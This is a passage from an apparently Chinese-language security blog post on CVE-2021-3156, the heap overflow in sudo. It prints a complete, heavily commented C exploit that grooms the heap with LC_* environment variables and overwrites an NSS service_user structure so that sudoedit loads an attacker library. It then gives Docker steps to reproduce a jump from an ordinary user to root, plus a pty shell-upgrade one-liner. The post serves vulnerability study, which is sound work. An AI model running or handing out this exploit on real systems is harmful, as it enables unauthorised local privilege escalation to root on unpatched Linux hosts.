<p><font style="color:rgb(31, 35, 40);">最后通过sudoedit 参数可以溢出的长度是0x5f9，剩下的部分用环境变量中的 </font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);&quot;&gt;\\&lt;/font&gt;</code><font style="color:rgb(31, 35, 40);"> 补齐即可。环境变量只会拷贝一次。最后覆盖结构体的时候注意，so名字符串在结构体偏移0x30的位置，字符串前的结构体元素都要覆盖成 </font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);&quot;&gt;\x00&lt;/font&gt;</code><font style="color:rgb(31, 35, 40);"> 。</font></p>
<h3 id="最终-EXP"><a href="#最终-EXP" class="headerlink" title="最终 EXP"></a>最终 EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span> <span class="hljs-comment">// 用于 sqrt 函数</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span> </span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 这些是 glibc 定义的区域设置类别宏。</span><br><span class="hljs-comment"> * 漏洞利用代码使用这些宏对应的环境变量名（如 &quot;LC_CTYPE&quot;）</span><br><span class="hljs-comment"> * 来进行堆风水，因为 sudo 会处理这些环境变量，从而在堆上进行分配。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_CTYPE		 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_NUMERIC		 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_TIME		 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_COLLATE		 3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_MONETARY		 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_MESSAGES		 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_ALL		 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_PAPER		 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_NAME		 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_ADDRESS		 9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_TELEPHONE		10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_MEASUREMENT	11</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_IDENTIFICATION	12</span><br><br><span class="hljs-comment">// 预定义的环境变量名称数组，用于堆风水操作</span><br><span class="hljs-type">char</span> * envName[<span class="hljs-number">13</span>]=&#123;<span class="hljs-string">&quot;LC_CTYPE&quot;</span>,<span class="hljs-string">&quot;LC_NUMERIC&quot;</span>,<span class="hljs-string">&quot;LC_TIME&quot;</span>,<span class="hljs-string">&quot;LC_COLLATE&quot;</span>,<span class="hljs-string">&quot;LC_MONETARY&quot;</span>,<span class="hljs-string">&quot;LC_MESSAGES&quot;</span>,<span class="hljs-string">&quot;LC_ALL&quot;</span>,<span class="hljs-string">&quot;LC_PAPER&quot;</span>,<span class="hljs-string">&quot;LC_NAME&quot;</span>,<span class="hljs-string">&quot;LC_ADDRESS&quot;</span>,<span class="hljs-string">&quot;LC_TELEPHONE&quot;</span>,<span class="hljs-string">&quot;LC_MEASUREMENT&quot;</span>,<span class="hljs-string">&quot;LC_IDENTIFICATION&quot;</span>&#125;;<br><br><span class="hljs-comment">// 全局变量，用于跟踪 envName 数组的当前索引</span><br><span class="hljs-type">int</span> now=<span class="hljs-number">13</span>;<br><span class="hljs-comment">// 全局变量，用于跟踪我们已经创建的环境变量数量</span><br><span class="hljs-type">int</span> envnow=<span class="hljs-number">0</span>;<br><span class="hljs-comment">// 全局变量，用于跟踪我们已经创建的命令行参数数量</span><br><span class="hljs-type">int</span> argvnow=<span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 将要传递给 execve 的环境变量数组和命令行参数数组</span><br><span class="hljs-type">char</span> * envp[<span class="hljs-number">0x300</span>];<br><span class="hljs-type">char</span> * argv[<span class="hljs-number">0x300</span>];<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief 创建一个特定大小的环境变量，用于堆风水。</span><br><span class="hljs-comment"> * @param size 想要创建的堆块的数据区域大小。</span><br><span class="hljs-comment"> * @return 指向新创建的环境变量字符串的指针。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 这是堆风水的核心函数。通过调用它，可以在堆上分配指定大小的内存块。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> * <span class="hljs-title function_">addChunk</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span><br>&#123;<br>    now --; <span class="hljs-comment">// 从 envName 数组的末尾向前选择一个环境变量名</span><br>    <span class="hljs-type">char</span> * result;<br><br>    <span class="hljs-comment">// LC_ALL (索引为6) 是一个特殊的环境变量，sudo 会对其有不同的处理。</span><br>    <span class="hljs-comment">// 为了避免干扰我们精密的堆布局，这里直接跳过它。</span><br>    <span class="hljs-keyword">if</span>(now == <span class="hljs-number">6</span>)<br>    &#123;<br>        now --;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(now &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-comment">// 分配足够的内存来存储 &quot;NAME=C.UTF-8@AAAA...&quot; 这样的字符串</span><br>        result = <span class="hljs-built_in">malloc</span>(size + <span class="hljs-number">0x20</span>);<br>        <span class="hljs-comment">// 构造环境变量字符串</span><br>        <span class="hljs-built_in">strcpy</span>(result, envName[now]); <span class="hljs-comment">// e.g., &quot;LC_PAPER&quot;</span><br>        <span class="hljs-built_in">strcat</span>(result, <span class="hljs-string">&quot;=C.UTF-8@&quot;</span>);   <span class="hljs-comment">// sudo 会处理这种格式的区域设置</span><br>        <span class="hljs-comment">// 填充&#x27;A&#x27;字符，直到达到所需的总大小。</span><br>        <span class="hljs-comment">// 这是为了精确控制 malloc 分配的堆块大小。</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">9</span>; i &lt;= size - <span class="hljs-number">0x17</span>; i++)<br>            <span class="hljs-built_in">strcat</span>(result, <span class="hljs-string">&quot;A&quot;</span>);<br>        <br>        <span class="hljs-comment">// 将构造好的环境变量字符串添加到 envp 数组中</span><br>        envp[envnow++] = result;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief 创建最后一个环境变量块，通常用作填充或标记。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">final</span><span class="hljs-params">()</span><br>&#123;<br>    now--;<br>    <span class="hljs-type">char</span> * result;<br>    <span class="hljs-keyword">if</span>(now == <span class="hljs-number">6</span>)<br>    &#123;<br>        now--;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(now &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>        result = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>        <span class="hljs-built_in">strcpy</span>(result, envName[now]);<br>        <span class="hljs-built_in">strcat</span>(result, <span class="hljs-string">&quot;=xxxxxxxxxxxxxxxxxxxxx&quot;</span>); <span class="hljs-comment">// 内容不重要，只是为了占据一个堆块</span><br>        envp[envnow++] = result;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief 设置触发漏洞的命令行参数 (argv) 和用于精确定位的环境变量 (envp)。</span><br><span class="hljs-comment"> * @param size 目标 `user_args` 缓冲区的大小。</span><br><span class="hljs-comment"> * @param offset `user_args` 缓冲区与目标 `service_user` 结构体之间的预期距离。</span><br><span class="hljs-comment"> * @return 成功返回 0，失败返回 -1。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 这是最复杂的部分。它通过数学计算来确定需要多少个&#x27;\&#x27;参数和多长的&#x27;A&#x27;参数，</span><br><span class="hljs-comment"> * 从而使 sudo 分配的 `user_args` 缓冲区大小恰好为 `size`，并且溢出时能覆盖到 `offset` 距离外的数据。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setargv</span><span class="hljs-params">(<span class="hljs-type">int</span> size, <span class="hljs-type">int</span> offset)</span><br>&#123;<br>    size -= <span class="hljs-number">0x10</span>; <span class="hljs-comment">// 减去 malloc chunk 的元数据大小 (通常是16字节)，得到用户数据区域的大小</span><br>    <span class="hljs-type">signed</span> <span class="hljs-type">int</span> x, y;<br><br>    <span class="hljs-comment">// --- 以下部分是通过解一个复杂的方程来确定 x 和 y 的值 ---</span><br>    <span class="hljs-comment">// x: 单独的 &quot;\&quot; 命令行参数的数量</span><br>    <span class="hljs-comment">// y: 长字符串参数中 &#x27;A&#x27; 的数量</span><br>    <span class="hljs-comment">// 目标是让 sudo 内部拼接这些参数后，总长度接近一个特定值，从而精确控制 `user_args` 的分配大小。</span><br>    <span class="hljs-comment">// 这个方程源于对 sudo 参数处理逻辑的逆向工程。</span><br>    <span class="hljs-type">signed</span> <span class="hljs-type">int</span> a = <span class="hljs-number">-3</span>;<br>    <span class="hljs-type">signed</span> <span class="hljs-type">int</span> b = <span class="hljs-number">2</span> * size - <span class="hljs-number">3</span>;<br>    <span class="hljs-type">signed</span> <span class="hljs-type">int</span> c = <span class="hljs-number">2</span> * size - <span class="hljs-number">2</span> - offset * <span class="hljs-number">2</span>;<br>    <span class="hljs-type">signed</span> <span class="hljs-type">int</span> tmp = b * b - <span class="hljs-number">4</span> * a * c;<br>    <span class="hljs-keyword">if</span>(tmp &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 无解</span><br>    tmp = (<span class="hljs-type">signed</span> <span class="hljs-type">int</span>)<span class="hljs-built_in">sqrt</span>((<span class="hljs-type">double</span>)tmp * <span class="hljs-number">1.0</span>);<br>    <span class="hljs-type">signed</span> <span class="hljs-type">int</span> A = (<span class="hljs-number">0</span> - b + tmp) / (<span class="hljs-number">2</span> * a);<br>    <span class="hljs-type">signed</span> <span class="hljs-type">int</span> B = (<span class="hljs-number">0</span> - b - tmp) / (<span class="hljs-number">2</span> * a);<br>    <br>    <span class="hljs-comment">// 选择一个合适的正数解</span><br>    <span class="hljs-keyword">if</span>(A &lt; <span class="hljs-number">0</span> &amp;&amp; B &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span>((A &gt; <span class="hljs-number">0</span> &amp;&amp; B &lt; <span class="hljs-number">0</span>) || (A &lt; <span class="hljs-number">0</span> &amp;&amp; B &gt; <span class="hljs-number">0</span>)) x = (A &gt; <span class="hljs-number">0</span>) ? A : B;<br>    <span class="hljs-keyword">if</span>(A &gt; <span class="hljs-number">0</span> &amp;&amp; B &gt; <span class="hljs-number">0</span>) x = (A &lt; B) ? A : B;<br>    <br>    y = size - <span class="hljs-number">1</span> - x * <span class="hljs-number">2</span>; <span class="hljs-comment">// 根据 x 计算 y</span><br>    <br>    <span class="hljs-comment">// `len` 是根据 sudo 的解析逻辑计算出的拼接后字符串的实际长度。</span><br>    <span class="hljs-comment">// 我们需要微调 x, y 以确保溢出能精确命中目标。</span><br>    <span class="hljs-type">int</span> len = x + y + (x + y + y + <span class="hljs-number">1</span>) * x / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">while</span> ((<span class="hljs-type">signed</span> <span class="hljs-type">int</span>)(offset - len) &lt; <span class="hljs-number">2</span>)<br>    &#123;<br>        x--;<br>        y = size - <span class="hljs-number">1</span> - x * <span class="hljs-number">2</span>;<br>        len = x + y + (x + y + y + <span class="hljs-number">1</span>) * x / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span>(x &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// `envoff` 是需要填充的单字节环境变量的数量。</span><br>    <span class="hljs-comment">// argv 和 envp 在内存中是连续的，利用这些小环境变量可以进行像素级的微调，</span><br>    <span class="hljs-comment">// 以确保堆布局的精确性。</span><br>    <span class="hljs-type">int</span> envoff = offset - len - <span class="hljs-number">2</span> + <span class="hljs-number">0x30</span>;<br>    <br>    <span class="hljs-comment">// 创建长字符串参数 &quot;AAAA...&quot;</span><br>    <span class="hljs-type">char</span> * Astring = <span class="hljs-built_in">malloc</span>(size);<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; y; i++)<br>        Astring[i] = <span class="hljs-string">&#x27;A&#x27;</span>;<br>    Astring[i] = <span class="hljs-string">&#x27;\x00&#x27;</span>; <span class="hljs-comment">// null 结尾</span><br><br>    <span class="hljs-comment">// --- 开始构建 argv 数组 ---</span><br>    argv[argvnow++] = <span class="hljs-string">&quot;sudoedit&quot;</span>; <span class="hljs-comment">// 命令本身</span><br>    argv[argvnow++] = <span class="hljs-string">&quot;-s&quot;</span>;       <span class="hljs-comment">// 触发漏洞逻辑的参数</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; x; i++)<br>        argv[argvnow++] = <span class="hljs-string">&quot;\\&quot;</span>;   <span class="hljs-comment">// x 个单独的&#x27;\&#x27;参数</span><br>    argv[argvnow++] = Astring;    <span class="hljs-comment">// 长字符串参数</span><br>    argv[argvnow++] = <span class="hljs-string">&quot;\\&quot;</span>;       <span class="hljs-comment">// **漏洞触发器**: 以单个&#x27;\&#x27;结尾的最后一个参数</span><br>    argv[argvnow++] = <span class="hljs-literal">NULL</span>;       <span class="hljs-comment">// argv 数组以 NULL 结尾</span><br><br>    <span class="hljs-comment">// --- 开始构建 envp 数组 ---</span><br>    <span class="hljs-comment">// 添加用于微调内存位置的单&#x27;\&#x27;环境变量</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; envoff; i++)<br>        envp[envnow++] = <span class="hljs-string">&quot;\\&quot;</span>;<br>    <br>    <span class="hljs-comment">// **核心Payload**: 这个环境变量将会被复制到溢出区域。</span><br>    <span class="hljs-comment">// 当它覆盖 service_user-&gt;name 字段时，前面的&#x27;\\&#x27;和&#x27;\&#x27;参数在sudo处理时</span><br>    <span class="hljs-comment">// 会留下一个 NULL 字节，恰好将 &quot;X/test&quot; 变成 &quot;/test&quot;。</span><br>    <span class="hljs-comment">// sudo 最终会尝试加载 `libnss_/test.so`。</span><br>    envp[envnow++] = <span class="hljs-string">&quot;X/test&quot;</span>; <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// 1. 设置命令行参数和精调环境变量</span><br>    <span class="hljs-comment">//    目标 `user_args` 缓冲区大小为 0xa0</span><br>    <span class="hljs-comment">//    目标 `service_user` 结构体距离缓冲区 0x650 字节</span><br>    <span class="hljs-comment">//    这些值是针对特定libc版本和系统架构调试出来的。</span><br>    setargv(<span class="hljs-number">0xa0</span>, <span class="hljs-number">0x650</span>);<br><br>    <span class="hljs-comment">// 2. 进行堆风水布局</span><br>    <span class="hljs-comment">//    创建一系列特定大小的堆块来操纵 glibc 的 malloc 状态。</span><br>    <span class="hljs-comment">//    目的是在 `sudo` 申请 `service_user` 结构体内存时，</span><br>    <span class="hljs-comment">//    使其恰好分配在我们期望的位置 (即 `user_args` 缓冲区之后 0x650 字节处)。</span><br>    addChunk(<span class="hljs-number">0x40</span>);<br>    addChunk(<span class="hljs-number">0x40</span>);<br>    addChunk(<span class="hljs-number">0xa0</span>); <span class="hljs-comment">// 创建一个和 `user_args` 同样大小的&quot;洞&quot;，增加布局成功率</span><br>    addChunk(<span class="hljs-number">0x40</span>);<br>    <br>    <span class="hljs-comment">// 3. 添加最后一个环境变量块作为填充</span><br>    final();<br><br>    <span class="hljs-comment">// 4. 执行 sudoedit，传入我们精心构造的 argv 和 envp</span><br>    <span class="hljs-comment">//    此时，漏洞被触发，提权发生。</span><br>    execve(<span class="hljs-string">&quot;/usr/local/bin/sudoedit&quot;</span>, argv, envp); <span class="hljs-comment">// 注意：路径可能需要根据系统调整 (e.g., /usr/local/bin/sudoedit)</span><br>&#125;<br><br></code></pre></td></tr></table></figure>





<h2 id="docker-复现"><a href="#docker-复现" class="headerlink" title="docker 复现"></a>docker 复现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull chenaotian/cve-2021-3156 		<span class="hljs-comment">#拉取镜像</span><br><br>docker run -it --name cve-3156 chenaotian/cve-2021-3156 /bin/bash			<span class="hljs-comment">#启动容器</span><br>  run：创建并启动一个docker容器<br>  -it：交互式终端<br>  --name：给这个docker容器起一个名字<br>  /bin/bash：启动容器后执行/bin/bash进入ubuntu命令行终端<br>docker start -ai cve-3156			<span class="hljs-comment">#再次运行该容器</span><br><br><br>进入docker环境中的root目录	<br>su <span class="hljs-built_in">test</span>				<span class="hljs-comment">#切换到普通用户</span><br>./exp					<span class="hljs-comment">#执行exp</span><br><span class="hljs-built_in">whoami</span>				<span class="hljs-comment">#变为root用户</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>



<p>命令行美化：</p>
<p>python3 -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p>CTF Wiki：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/</a></p>
<p>CVE-2021-3165：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Palpitate_LL/article/details/147118881?sharetype=blog&shareId=147118881&sharerefer=APP&sharesource=qq_62554190&sharefrom=qq">https://blog.csdn.net/Palpitate_LL&#x2F;article&#x2F;details&#x2F;147118881?sharetype&#x3D;blog&amp;shareId&#x3D;147118881&amp;sharerefer&#x3D;APP&amp;sharesource&#x3D;qq_62554190&amp;sharefrom&#x3D;qq</a></p>
<p><a target="_blank" rel="noopener" href="https://a1ex.online/2021/02/01/cve-2021-3156%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/">https://a1ex.online/2021/02/01/cve-2021-3156%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/IronmanJay/article/details/139379712">https://blog.csdn.net/IronmanJay/article/details/139379712</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/chenaotian/CVE-2021-3156?tab=readme-ov-file">https://github.com/chenaotian/CVE-2021-3156?tab=readme-ov-file</a></p>
<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1439734-1-1.html">https://www.52pojie.cn/thread-1439734-1-1.html</a></p>
<p>验证过程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/IronmanJay/article/details/139379712">https://blog.csdn.net/IronmanJay/article/details/139379712</a></p>
<p>sudo 源码：<a target="_blank" rel="noopener" href="https://www.sudo.ws/getting/source/">https://www.sudo.ws/getting/source/</a></p>
<p>poc：<a target="_blank" rel="noopener" href="https://github.com/blasty/CVE-2021-3156">https://github.com/blasty/CVE-2021-3156</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" class="category-chain-item">二进制</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/" class="print-no-link">#堆溢出利用手法</a>
      
        <a href="/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" class="print-no-link">#堆风水</a>
      
        <a href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/" class="print-no-link">#堆溢出漏洞利用链</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2021-3156_二进制漏洞高阶利用：堆风水</div>
      <div>https://jimi-lab.github.io/2025/08/19/CVE-2021-3156_二进制漏洞高阶利用：堆风水/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Jimi</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年8月19日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/09/29/paste2%E9%9D%B6%E6%9C%BA/" title="paste2靶机">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">paste2靶机</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/08/18/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/" title="堆溢出利用">
                        <span class="hidden-mobile">堆溢出利用</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments">
      
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'Jimi-Lab/Jimi-Lab.github.io');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'utterances');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
      
<a href="https://github.com/Jimi-Lab" target="_blank" rel="nofollow noopener"><span>@Jimi.github</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
